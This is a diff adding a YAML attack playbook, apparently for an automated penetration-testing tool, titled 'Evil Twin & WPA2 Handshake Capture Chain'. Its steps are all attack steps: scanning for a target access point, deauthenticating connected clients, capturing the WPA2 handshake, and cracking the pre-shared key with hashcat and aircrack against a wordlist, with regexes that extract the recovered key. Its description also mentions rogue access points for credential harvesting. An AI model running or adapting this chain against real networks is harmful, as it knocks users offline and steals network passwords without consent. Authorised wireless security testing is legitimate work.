@@ -1,0 +1,85 @@
+name: "Evil Twin & WPA2 Handshake Capture Chain"
+description: "Identify target Wi-Fi networks, deauthenticate clients, capture WPA2 handshakes, and crack the PSK. Includes rogue-AP concepts for credential harvesting."
+category: wireless
+attack_vector: "WLAN discovery → deauth → handshake capture → PSK cracking"
+variables:
+  interface:
+    required: true
+    description: "Wireless interface in monitor mode (e.g. wlan0mon)"
+  bssid:
+    required: true
+    description: "Target AP BSSID (e.g. AA:BB:CC:DD:EE:FF)"
+  channel:
+    required: false
+    default: "6"
+    description: "Target AP channel"
+cutting_edge: true
+references: ["Aircrack-ng suite", "Evil twin attack methodology", "WPA2 PMKID attack"]
+
+steps:
+  - name: "wifi_discovery"
+    tool: "airodump_capture"
+    description: "Discover nearby networks and identify target AP"
+    args:
+      interface: "{{interface}}"
+      channel: "{{channel}}"
+    expected_output: "BSSID|ESSID|WPA2"
+    timeout: 120
+    gate: true
+    retries: 1
+    extracts:
+      - var: "essid"
+        regex: "(?:ESSID|\\bSSID\\b)[\\s:]+\\\"?([A-Za-z0-9_\\- ]+)\\\"?"
+
+  - name: "deauth_clients"
+    tool: "aireplay_attack"
+    description: "Deauthenticate connected clients to force handshake renegotiation"
+    args:
+      interface: "{{interface}}"
+      bssid: "{{bssid}}"
+      attack: "deauth"
+    expected_output: null
+    timeout: 120
+    gate: false
+    retries: 2
+
+  - name: "handshake_capture"
+    tool: "airodump_capture"
+    description: "Capture WPA2 4-way handshake on target channel"
+    args:
+      interface: "{{interface}}"
+      channel: "{{channel}}"
+    expected_output: "WPA handshake|handshake"
+    timeout: 300
+    gate: true
+    retries: 2
+    extracts:
+      - var: "cap_file"
+        regex: "([\\w\\-]+\\.cap)"
+
+  - name: "pmkid_attack"
+    tool: "hashcat_crack"
+    description: "Attempt PMKID cracking (hashcat mode 22000) from capture"
+    args:
+      hash_file: "output/handshake_capture.stdout.txt"
+      wordlist: "/usr/share/wordlists/rockyou.txt"
+      mode: 22000
+      attack_mode: 0
+    expected_output: "Cracked|Recovered|Session"
+    timeout: 3600
+    gate: false
+    retries: 0
+
+  - name: "psk_crack"
+    tool: "aircrack_crack"
+    description: "Crack WPA2 PSK from captured handshake with wordlist"
+    args:
+      cap_file: "{{cap_file}}"
+      wordlist: "/usr/share/wordlists/rockyou.txt"
+    expected_output: "KEY FOUND|WPA"
+    timeout: 3600
+    gate: false
+    retries: 0
+    extracts:
+      - var: "psk"
+        regex: "KEY FOUND!\\s*\\[\\s*([^\\]]+)\\s*\\]"
